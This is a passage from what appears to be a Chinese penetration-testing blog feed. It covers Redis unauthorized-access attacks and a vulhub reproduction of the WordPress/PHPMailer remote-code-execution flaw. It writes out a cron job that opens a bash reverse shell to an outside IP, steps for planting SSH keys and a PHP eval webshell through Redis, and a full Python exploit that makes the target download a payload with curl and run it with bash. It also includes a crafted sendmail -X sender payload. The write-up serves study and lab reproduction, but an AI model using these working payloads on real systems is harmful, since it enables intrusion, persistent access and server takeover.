/var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p><strong>2.修改备份的文件的名称</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure><p><strong>3.设置计划任务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure><p><strong>4.保存</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure><p>然后上服务器监听就ok了 不过这种方式我并没有getshell过,原因位置,后续再慢慢看吧...</p><h3 id="写sshkey来getshell"><strong>写sshkey来getshell</strong></h3><p><strong>1.生产密钥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>选rsa,认证自己定,然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n\n&quot;) &gt; pub.txt</span><br></pre></td></tr></table></figure><p><strong>2.将密钥写到服务器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">config set 233 &quot;xxxx&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>这里的xxx就是pub.txt里面的东西,其实可以直接copy 一下id_rsa.pub里面的东西,然后前后加回车即可。 <strong>3.连接就ok了</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><h3 id="写webshell"><strong>写webshell</strong></h3><p>一样的原理 不过限制就是:要求web目录已知,而且当前用户在目录有写权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/test.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;fuck&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>这里先把redis下的攻击方式写一下,后续应该还会分析一下phithon的那篇ssrf和python的博客。 参考链接: <a href="http://foreversong.cn/archives/1180" title="http://foreversong.cn/archives/1180">http://foreversong.cn/archives/1180</a> Adog-redis在渗透测试中的利用 <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" title="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a> phithon-利用redis写webshell <a href="https://lorexxar.cn/2016/12/03/redis-getshell/" title="https://lorexxar.cn/2016/12/03/redis-getshell/">https://lorexxar.cn/2016/12/03/redis-getshell/</a> Lorexxar-通过redis getshell的一些小问题</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub复现(大概持续更新)</title>
      <link href="/2018/07/02/vulhub%E5%A4%8D%E7%8E%B0%E5%A4%A7%E6%A6%82%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
      <url>/2018/07/02/vulhub%E5%A4%8D%E7%8E%B0%E5%A4%A7%E6%A6%82%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>git地址 <a href="https://github.com/wupco/vulhub.git" title="https://github.com/wupco/vulhub.git">https://github.com/wupco/vulhub.git</a></p><h2 id="wordpress-phpmailed-rce">wordpress-phpmailed-rce</h2><h3 id="原理">原理</h3><p>phpmailer代码执行漏洞 <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" title="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a> 参考:<a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html" title="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p><h3 id="搭环境">搭环境</h3><p>装docker,切目录,然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后上站点自己配一下账号就可以了</p><h3 id="攻击">攻击</h3><p>也没啥好说的,脚本给出了,vps上建个文件,然后监听 攻击机执行exp 然后拿到目标机shell <img src="/images/2018/07/phpmailedrce.jpg" alt="blacsheep" /> payload改造版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># wordpress&#x27;s url</span></span><br><span class="line">target = <span class="string">&#x27;http://192.168.188.128/&#x27;</span></span><br><span class="line"><span class="comment"># Put your command in a website, and use the website&#x27;s url</span></span><br><span class="line"><span class="comment"># don&#x27;t contains &quot;http://&quot;, must be all lowercase</span></span><br><span class="line">shell_url = <span class="string">&#x27;blog.blacsheep.cn/xxx&#x27;</span></span><br><span class="line"><span class="comment"># an exists user</span></span><br><span class="line">user = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_command</span>(<span class="params">command</span>):</span><br><span class="line">    command = <span class="string">&#x27;$&#123;run&#123;%s&#125;&#125;&#x27;</span> % command</span><br><span class="line">    command = command.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;&#x27;</span>)</span><br><span class="line">    command = command.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;target(any -froot@localhost -be %s null)&#x27;</span> % command</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;user_login&#x27;</span>: user,</span><br><span class="line">    <span class="string">&#x27;redirect_to&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wp-submit&#x27;</span>: <span class="string">&#x27;Get New Password&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: generate_command(<span class="string">&#x27;/usr/bin/curl -o/tmp/rce &#x27;</span> + shell_url),</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">target += <span class="string">&#x27;/wp-login.php?action=lostpassword&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># requests.post(target, headers=headers, data=data, proxies=proxies, allow_redirects=False)</span></span><br><span class="line"><span class="comment"># headers[&#x27;Host&#x27;] = generate_command(&#x27;/bin/bash /tmp/rce&#x27;)</span></span><br><span class="line"><span class="comment"># requests.post(target, headers=headers, data=data, proxies=proxies, allow_redirects=False)</span></span><br><span class="line"></span><br><span class="line">requests.post(target, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">headers[<span class="string">&#x27;Host&#x27;</span>] = generate_command(<span class="string">&#x27;/bin/bash /tmp/rce&#x27;</span>)</span><br><span class="line">requests.post(target, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="分析">分析</h3><p>参考phithon师傅的博客 首先这个rce也是由mail函数的第五个参数导致的,mail函数最终调用系统的sendmail发送邮件,而sendmail支持-X参数,这个参数可以将日志写入文件,也就可以写shell了 <img src="/images/2018/07/phithon-1.jpg" alt="blacsheep" /> 不过这里不支持shell语法,phpmailed调用的时候也会进行检测,代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check that a string looks like an email address.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $address The email address to check</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stringcallable $patternselect A selector for the validation pattern to use :</span></span><br><span class="line"><span class="comment">     * * `auto` Pick best pattern automatically;</span></span><br><span class="line"><span class="comment">     * * `pcre8` Use the squiloople.com pattern, requires PCRE &gt; 8.0, PHP &gt;= 5.3.2, 5.2.14;</span></span><br><span class="line"><span class="comment">     * * `pcre` Use old PCRE implementation;</span></span><br><span class="line"><span class="comment">     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL;</span></span><br><span class="line"><span class="comment">     * * `html5` Use the pattern given by the HTML5 spec for &#x27;email&#x27; type form input elements.</span></span><br><span class="line"><span class="comment">     * * `noregex` Don&#x27;t use a regex: super fast, really dumb.</span></span><br><span class="line"><span class="comment">     * Alternatively you may pass in a callable to inject your own validator, for example:</span></span><br><span class="line"><span class="comment">     * PHPMailer::validateAddress(&#x27;user<span class="doctag">@example</span>.com&#x27;, function($address) &#123;</span></span><br><span class="line"><span class="comment">     *     return (strpos($address, &#x27;@&#x27;) !== false);</span></span><br><span class="line"><span class="comment">     * &#125;);</span></span><br><span class="line"><span class="comment">     * You can also set the PHPMailer::$validator static to a callable, allowing built-in methods to use your validator.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$patternselect</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$patternselect</span>)) &#123;</span><br><span class="line">            <span class="variable">$patternselect</span> = <span class="built_in">self</span>::<span class="variable">$validator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$patternselect</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$patternselect</span>, <span class="variable">$address</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&quot;\n&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&quot;\r&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$patternselect</span> <span class="keyword">or</span> <span class="variable">$patternselect</span> == <span class="string">&#x27;auto&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">            <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PCRE_VERSION&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PCRE_VERSION, <span class="string">&#x27;8.0.3&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre8&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;extension_loaded&#x27;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;pcre&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">                <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;5.2.0&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;noregex&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$patternselect</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre8&#x27;</span>:</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@link</span> http://squiloople.com/2009/12/20/email-address-validation/</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@copyright</span> 2009-2010 Michael Rushton</span></span><br><span class="line"><span class="comment">                 * Feel free to use and redistribute this code. But please keep this copyright notice.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?(?1))&#123;255,&#125;)(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?(?1))&#123;65,&#125;@)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#x27;*-\[\]-\x7F]\\\[\x00-\x7F](?3)))*(?2)\)))+(?2))(?2))?)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;([!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\x7F]))*&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;(?1)\.(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?5))&#123;0,126&#125;\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]&#123;1,4&#125;)(?&gt;:(?6))&#123;7&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)((?6)(?&gt;:(?6))&#123;0,6&#125;)?::(?7)?))(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6))&#123;5&#125;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?8)?::(?&gt;((?6)(?&gt;:(?6))&#123;0,4&#125;):)?))?(25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[1-9]?[0-9])(?&gt;\.(?9))&#123;3&#125;))\])(?1)$/isD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre&#x27;</span>:</span><br><span class="line">                <span class="comment">//An older regex that doesn&#x27;t need a recent PCRE</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^(?!(?&gt;&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?)&#123;255,&#125;)(?!(?&gt;&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?)&#123;65,&#125;@)(?&gt;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\xFF]))*&quot;)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;\.(?&gt;[!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\xFF]))*&quot;))*&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;@(?&gt;(?![a-z0-9-]&#123;64,&#125;)(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]&#123;64,&#125;)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?))&#123;0,126&#125;\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]&#123;1,4&#125;)(?&gt;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-f0-9]&#123;1,4&#125;)&#123;7&#125;(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;::(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?))(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;)?&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;::(?&gt;(?:[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;):)?))?(?&gt;25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;[1-9]?[0-9]))&#123;3&#125;))\])$/isD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;html5&#x27;</span>:</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * This is the pattern used in the HTML5 spec for validation of &#x27;email&#x27; type form input elements.</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@link</span> http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^[a-zA-Z0-9.!#$%&amp;\&#x27;*+\/=?^_`&#123;&#125;~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$/sD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;noregex&#x27;</span>:</span><br><span class="line">                <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">                <span class="comment">//Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$address</span>) &gt;= <span class="number">3</span></span><br><span class="line">                    <span class="keyword">and</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&#x27;@&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">and</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&#x27;@&#x27;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$address</span>) - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">filter_var</span>(<span class="variable">$address</span>, FILTER_VALIDATE_EMAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="分析patternselect">分析patternselect</h4><p>分析一下patternselect决定对email的判断 1.默认的是auto,自动选择一个方式对email进行检测 2.如果php支持pcre那么就用正则来检测 3.如果不支持pcre但是php版本大于5.2就用php的filter进行检测 4.如果不支持pcre但是php版本小于5.2那么直接检查email是否包含@符号 那么目前来看,最佳情况就是php版本小于5.2而且不支持正则表达式(未安装pcre扩展) 不过p神表示还是有其他的方式也是可以打的,比如开发者手动指定email检查 <img src="/images/2018/07/phithon-2.jpg" alt="blacsheep" /></p><h4 id="分析正则表达式">分析正则表达式</h4><p><a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html" title="p神的分析过程">p神的分析过程</a> 最终就是在@前面加上括号就可以加入空格,payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa( -X/home/www/success.php )@qq.com</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;PHPMailer/PHPMailerAutoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$from</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$mail</span> = <span class="keyword">new</span> <span class="title class_">PHPMailer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">setFrom</span>(<span class="variable">$from</span>);</span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">addAddress</span>(<span class="string">&#x27;joe@example.net&#x27;</span>, <span class="string">&#x27;Joe User&#x27;</span>);     <span class="comment">// Add a recipient</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">isHTML</span>(<span class="literal">true</span>);                                  <span class="comment">// Set email format to HTML</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;Subject = <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$mail</span>-&gt;Body    = <span class="string">&#x27;This is the HTML message body &lt;b&gt;in bold!&lt;/b&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$mail</span>-&gt;AltBody = <span class="string">&#x27;This is the body in plain text for non-HTML mail clients&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$mail</span>-&gt;<span 